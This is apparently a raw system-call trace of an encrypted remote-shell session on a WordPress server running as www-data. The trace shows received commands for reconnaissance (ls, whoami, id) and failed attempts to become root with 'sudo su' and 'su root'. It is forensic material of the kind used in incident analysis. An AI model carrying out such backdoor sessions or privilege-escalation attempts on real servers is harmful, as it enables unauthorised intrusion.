+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=176476})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\352", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\352\262\233X\364\317\377\250\254M\327\24B[\225\347Q\302\302\306\352\262\233Y\352\262\2330\352\262\233X"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+sendto(11, "\231`vl\207\35\22\234\337\237: 1\211x\323\"\20/\362\231`vm\231`v\24\231`vm"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=980173})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "O", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "Ow\23\337Q\nw/\t\210_\223\347\236\35`\364\7JAOw\23\336Ow\23\207Ow\23\337"..., 8192, MSG_DONTWAIT, NULL, NULL) = 112
+uname({sysname="Linux", nodename="245f54697878", ...}) = 0
+uname({sysname="Linux", nodename="245f54697878", ...}) = 0
+sendto(11, "\241)|A\277T\30\261\347\3260\r\t\300r\376\32Y%\337\241)|@\241)|\251\241)|@"..., 256, MSG_DONTWAIT, NULL, 0) = 256
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=953331})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\372", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\372\216\264@\344\363\320\260\274q\370\fRg\272\377A\376\355\336\372\216\264A\372\216\2648\372\216\264@"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+pipe([12, 13])                          = 0
+pipe([14, 15])                          = 0
+pipe([16, 17])                          = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f85e3f4d790) = 77
+close(12)                               = 0
+fstat(13, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(13, F_SETFD, FD_CLOEXEC)          = 0
+close(15)                               = 0
+fstat(14, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(14, F_SETFD, FD_CLOEXEC)          = 0
+close(17)                               = 0
+fstat(16, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(16, F_SETFD, FD_CLOEXEC)          = 0
+wait4(77, 0x7ffd088e3574, WNOHANG|WSTOPPED, NULL) = 0
+sendto(11, "\240\33\350 \276f\214\320\346\344\244l\10\362\346\237\33k\261\276\240\33\350!\240\33\350\210\240\33\350!"..., 192, MSG_DONTWAIT, NULL, 0) = 192
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=946748})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\200", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\200ix\215\236\24\34}\306\2264\301(\200v2;\31!\23\200ix\214\200ix\345\200ix\215"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+sendto(11, "@\350\243u^\225\307\205\6\27\3579\350\1\255\312\373\230\372\353@\350\243t@\350\243\r@\350\243t"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=667363})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "[", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "[m\203\324E\20\347$\35\222\317\230\363\204\215k\340\35\332J[m\203\325[m\203\254[m\203\324"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "ls\n", 3)                    = 3
+sendto(11, "\10v\306|\26\v\242\214N\211\2120\240\237\310\303\263\6\237\342\10v\306}\10v\306\364\10v\306}"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=999338})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+fcntl(14, F_GETFL)                      = 0 (flags O_RDONLY)
+read(14, "2021\n", 8192)                = 5
+sendto(11, "Z\360\356yD\215\212\211\34\17\2425\362\31\340\306\341\200\267\347Z\360\356xZ\360\356\341Z\360\356y"..., 176, MSG_DONTWAIT, NULL, 0) = 176
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=469022})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\345", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\345;\310\330\373F\254(\243\304\204\224M\322\306g^K\221F\345;\310\331\345;\310\240\345;\310\330"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "cd ..\n", 6)                 = 6
+sendto(11, "\232=\273\237\204@\337o\334\302\367\3232\324\265 !M\342\1\232=\273\236\232=\273\27\232=\273\236"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=659645})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\376", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\3761\214/\340L\350\337\270\316\300cV\330\202\220EA\325\261\3761\214.\3761\214W\3761\214/"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "ls\n", 3)                    = 3
+sendto(11, "]\334P7C\2414\307\33#\34{\3655^\210\346\254\t\251]\334P6]\334P\277]\334P6"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=999370})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+fcntl(14, F_GETFL)                      = 0 (flags O_RDONLY)
+read(14, "index.php\nplugins\nthemes\nupgrade"..., 8192) = 41
+sendto(11, "\2\364Y%\34\211=\325D\v\25i\252\35W\232\271\204\0\273\2\364Y$\2\364Y\235\2\364Y%"..., 208, MSG_DONTWAIT, NULL, 0) = 208
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=69992})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\10", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\10F\306G\26;\242\267N\271\212\v\240\257\310\370\2636\237\331\10F\306F\10F\306?\10F\306G"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "cd ../..\n", 9)              = 9
+sendto(11, "\212,]h\224Q9\230\314\323\21$\"\305S\3271\\\4\366\212,]i\212,]\340\212,]i"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=401267})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\200", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\200n{\262\236\23\37B\306\2217\376(\207u\r;\36\",\200n{\263\200n{\312\200n{\262"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "ls -l\n", 6)                 = 6
+sendto(11, "}@(lc=L\234;\277d \325\251&\323\3060q\362}@(m}@(\344}@(m"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=998806})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+fcntl(14, F_GETFL)                      = 0 (flags O_RDONLY)
+read(14, "total 4\ndrwxr-xr-x 5 www-data ww"..., 8192) = 62
+sendto(11, "\354\270EJ\362\305!\272\252G\t\6DQK\365W\310\34\324\354\270EK\354\270E\202\354\270EJ"..., 224, MSG_DONTWAIT, NULL, 0) = 224
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=60173})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\221", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\221c\251\25\217\36\315\345\327\234\345Y9\212\247\252*\23\360\213\221c\251\24\221c\251m\221c\251\25"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "whoami\n", 7)                = 7
+sendto(11, "\213\373\3301\225\206\274\301\315\4\224}#\22\326\2160\213\201\257\213\373\3300\213\373\330\271\213\373\3300"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=999345})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+fcntl(14, F_GETFL)                      = 0 (flags O_RDONLY)
+read(14, "www-data\n", 8192)            = 9
+sendto(11, "vf}gh\33\31\2270\2311+\336\217s\330\315\26$\371vf}fvf}\377vf}g"..., 176, MSG_DONTWAIT, NULL, 0) = 176
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=669877})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "<", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "<\2\362?\"\177\226\317z\375\276s\224\353\374\200\207r\253\241<\2\362><\2\362G<\2\362?"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "id\n", 3)                    = 3
+sendto(11, "\266\254Xk\250\321<\233\360S\24'\36EV\324\r\334\1\365\266\254Xj\266\254X\343\266\254Xj"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=998851})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+fcntl(14, F_GETFL)                      = 0 (flags O_RDONLY)
+read(14, "uid=33(www-data) gid=33(www-data"..., 8192) = 54
+sendto(11, ")\222\233\2367\357\377nom\327\322\201{\225!\222\342\302\0)\222\233\237)\222\233V)\222\233\236"..., 224, MSG_DONTWAIT, NULL, 0) = 224
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=981179})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\277", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\277\353\373s\241\226\237\203\371\24\267?\27\2\365\314\4\233\242\355\277\353\373r\277\353\373\v\277\353\373s"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "sudo su\n", 8)               = 8
+sendto(11, "&\266f\3128\313\2:`I*\206\216_hu\235\306?T&\266f\313&\266fB&\266f\313"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [16], left {tv_sec=0, tv_usec=999998})
+select(17, [16], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [16], left {tv_sec=0, tv_usec=0})
+fcntl(16, F_GETFL)                      = 0 (flags O_RDONLY)
+read(16, "/bin/sh: 8: sudo: not found\n", 8192) = 28
+sendto(11, "\35\206\352\235\3\373\216m[y\246\321\265o\344\"\246\366\263\3\35\206\352\234\35\206\3525\35\206\352\235"..., 192, MSG_DONTWAIT, NULL, 0) = 192
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=970082})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\344", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\344k\320A\372\26\264\261\242\224\234\rL\202\336\376_\33\211\337\344k\320@\344k\3209\344k\320A"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "\n", 1)                      = 1
+sendto(11, "\300/.f\336RJ\226\206\320b*h\306 \331{_w\370\300/.g\300/.\356\300/.g"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=845221})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\250", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\250wi\261\266\n\rA\356\210%\375\0\236g\16\23\0070/\250wi\260\250wi\311\250wi\261"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "su roo\n", 7)                = 7
+sendto(11, "\340C\227\323\376>\363#\246\274\333\237H\252\231l[3\316M\340C\227\322\340C\227[\340C\227\322"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [16], left {tv_sec=0, tv_usec=999390})
+select(17, [16], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [16], left {tv_sec=0, tv_usec=0})
+fcntl(16, F_GETFL)                      = 0 (flags O_RDONLY)
+read(16, "su: must be run from a terminal\n", 8192) = 32
+sendto(11, "t\351\236\244j\224\372T2\26\322\350\334\0\220\33\317\231\307:t\351\236\245t\351\236\ft\351\236\244"..., 192, MSG_DONTWAIT, NULL, 0) = 192
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=100025})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\202", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\202y\351G\234\4\215\267\304\206\245\v*\220\347\3709\t\260\331\202y\351F\202y\351?\202y\351G"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "\n", 1)                      = 1
+sendto(11, "\316\r<c\320pX\223\210\362p/f\3442\334u}e\375\316\r<b\316\r<\353\316\r<b"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=482338})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\243", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\243\216\256o\275\363\312\237\345q\342#\vg\240\320\30\376\367\361\243\216\256n\243\216\256\27\243\216\256o"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "su root\n", 8)               = 8
+sendto(11, "\343\206s\306\375\373\0276\245y?\212Ko}yX\366*X\343\206s\307\343\206sN\343\206s\307"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [16], left {tv_sec=0, tv_usec=999423})
+select(17, [16], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [16], left {tv_sec=0, tv_usec=0})
+fcntl(16, F_GETFL)                      = 0 (flags O_RDONLY)
+read(16, "su: must be run from a terminal\n", 8192) = 32
+sendto(11, "\340+\r\10\376Vi\370\246\324ADH\302\3\267[[T\226\340+\r\t\340+\r\240\340+\r\10"..., 192, MSG_DONTWAIT, NULL, 0) = 192
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
